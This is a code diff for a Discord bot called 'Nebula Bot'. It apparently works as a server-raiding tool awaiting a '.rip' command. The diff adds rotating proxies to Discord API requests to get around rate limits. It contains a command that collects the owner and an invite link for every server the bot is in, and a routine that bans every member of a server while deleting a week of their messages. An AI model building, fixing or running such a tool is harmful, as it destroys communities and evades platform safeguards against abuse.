@@ -2,11 +2,11 @@ const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
 const fs = require('fs');
-
 dotenv.config();
 
 // ====== PROXY SETUP ======
-const { HttpProxyAgent } = require('https-proxy-agent');
+// Fixed import for https-proxy-agent v6+
+const { HttpProxyAgent } = require('https-proxy-agent/http');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 
 let proxies = [];
@@ -16,7 +16,8 @@ function loadProxies() {
   try {
     const data = fs.readFileSync('proxies.txt', 'utf-8');
     proxies = data
-      .split('\n')
+      .split('\n') // Fixed: use \n instead of literal 
+ for cross-platform
       .map(line => line.trim())
       .filter(line => line && !line.startsWith('#'));
     console.log(`✅ Loaded ${proxies.length} proxies.`);
@@ -28,18 +29,17 @@ function loadProxies() {
 
 function getProxyAgent() {
   if (proxies.length === 0) return null;
-
   const proxy = proxies[currentProxyIndex];
   currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
 
   if (proxy.startsWith('socks5://')) {
     return new SocksProxyAgent(proxy);
   } else {
-    return new HttpProxyAgent(proxy);
+    return new HttpProxyAgent(proxy); // Now works correctly
   }
 }
 
-// Reload proxies every 5 minutes (optional)
+// Reload proxies every 5 minutes
 setInterval(loadProxies, 5 * 60 * 1000);
 loadProxies(); // Initial load
 
@@ -62,7 +62,7 @@ const originalRequest = rest.request.bind(rest);
 rest.request = async function (options) {
   const agent = getProxyAgent();
   if (agent) {
-    options.agent = agent;
+    options.agent = { https: agent }; // Discord uses HTTPS → assign to options.agent.https
   }
   return await originalRequest(options);
 };
@@ -70,9 +70,11 @@ rest.request = async function (options) {
 // ====== WEB SERVER FOR PORT 3000 ======
 const app = express();
 const PORT = process.env.PORT || 3000;
+
 app.get('/', (req, res) => {
   res.send('Nebula Bot is online and awaiting .rip command...');
 });
+
 app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
@@ -85,7 +87,7 @@ async function handleRateLimit(promiseFn, maxRetries = 5) {
       return await promiseFn();
     } catch (error) {
       if (error.code === 429) {
-        const retryAfter = (error.retry_after || 1000) * 1.2; // Add 20% buffer
+        const retryAfter = (error.retry_after || 1000) * 1.2;
         console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
         await new Promise(resolve => setTimeout(resolve, retryAfter));
         retries++;
@@ -125,6 +127,7 @@ client.on('ready', () => {
 
 client.on('messageCreate', async (message) => {
   if (!message.content.startsWith('.') || message.author.bot) return;
+
   const args = message.content.slice(1).trim().split(/ +/);
   const command = args[0].toLowerCase();
 
@@ -170,6 +173,7 @@ client.on('messageCreate', async (message) => {
         const invites = await handleRateLimit(() => guild.invites.fetch());
         const firstInvite = invites?.first() || null;
         const owner = await handleRateLimit(() => guild.fetchOwner());
+
         serverList.push({
           name: guild.name,
           id: guild.id,
@@ -196,26 +200,32 @@ client.on('messageCreate', async (message) => {
       const value = server.error
         ? `ID: ${server.id}\n⚠️ ${server.error}`
         : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
+
       embed.addFields({ name: `${i + 1}. ${server.name}`, value });
     }
 
     try {
       await message.author.send({ embeds: [embed] });
+
       if (serverList.length > 25) {
         for (let i = 25; i < serverList.length; i += 25) {
           const page = serverList.slice(i, i + 25);
           const moreEmbed = new EmbedBuilder()
             .setColor('#00ffff')
             .setTitle(`🌐 Servers I'm In (Page ${Math.floor(i / 25) + 1})`);
+
           for (const server of page) {
             const value = server.error
               ? `ID: ${server.id}\n⚠️ ${server.error}`
               : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
+
             moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
           }
+
           await message.author.send({ embeds: [moreEmbed] });
         }
       }
+
       await message.reply('✅ Server list sent to your DMs!');
     } catch (err) {
       console.error('❌ Failed to send DM:', err.message);
@@ -254,6 +264,7 @@ client.on('messageCreate', async (message) => {
       }
 
       await message.reply(`🔪 Attempting to ban ${membersToBan.size} members...`);
+
       let bannedCount = 0;
       let failCount = 0;
 
@@ -263,6 +274,7 @@ client.on('messageCreate', async (message) => {
             reason: 'Nebula Ban All',
             deleteMessageSeconds: 604800
           }));
+
           if (result !== null) {
             console.log(`✅ Banned: ${member.user.tag}`);
             bannedCount++;
@@ -273,7 +285,8 @@ client.on('messageCreate', async (message) => {
           console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
           failCount++;
         }
-        await new Promise(r => setTimeout(r, 50)); // Small delay
+
+        await new Promise(r => setTimeout(r, 50));
       }
 
       console.log(`✅ Ban process finished. Banned: ${bannedCount}, Failed: ${failCount}`);
